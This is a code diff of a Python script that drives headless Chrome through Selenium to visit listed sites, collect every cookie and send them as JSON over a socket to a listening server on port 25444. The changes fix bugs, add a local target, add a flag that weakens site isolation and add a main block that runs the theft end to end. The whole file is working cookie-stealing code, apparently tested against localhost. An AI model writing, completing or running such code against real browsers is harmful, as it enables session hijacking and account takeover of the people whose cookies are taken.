@@ -1,5 +1,4 @@
 from selenium import webdriver
-from selenium.webdriver.chrome.service import service
 from selenium.webdriver.chrome.options import Options
 import time
 import socket
@@ -14,25 +13,25 @@ def get_chrome_cookies():
         chrome_options.add_argument('--headless')
         chrome_options.add_argument('--disable-gpu')
         chrome_options.add_argument('--disable-extensions')
+        chrome_options.add_argument("--disable-site-isolation-trials")
         
         #Create Chrome driver
-        driver = webdriver.Chrome(Options=chrome_options)
+        driver = webdriver.Chrome(options=chrome_options)
         
         #Visit sites
         sites = [
             #SITES
+            'http://127.0.0.1:5000'
         ]
         
         for site in sites:
             try:
                 driver.get(site)
-                time.sleep(5)
+                time.sleep(10)
                 #Get cookies
                 site_cookies = driver.get_cookies()
                 for cookie in site_cookies:
-                    cookie_name = cookie['name']
-                    cookie_value = cookie['value']
-                    cookies[cookie_name] = cookie_value
+                     cookies[cookie['name']] = cookie['value']
             except Exception as e:
                 continue
     except Exception as e:
@@ -50,5 +49,15 @@ def send_to_srv(cookies):
     client.connect(('localhost', 25444))
     client.sendall(json.dumps(cookies).encode('utf-8'))
     response = client.recv(1024)
+    try:
+        print(response.decode())
+    except:
+        print("No response")
     client.close()
-    
+   
+if __name__ == '__main__':
+    cookies = get_chrome_cookies()
+    if cookies:
+        send_to_srv(cookies)
+    else:
+        print("No cookies to send")
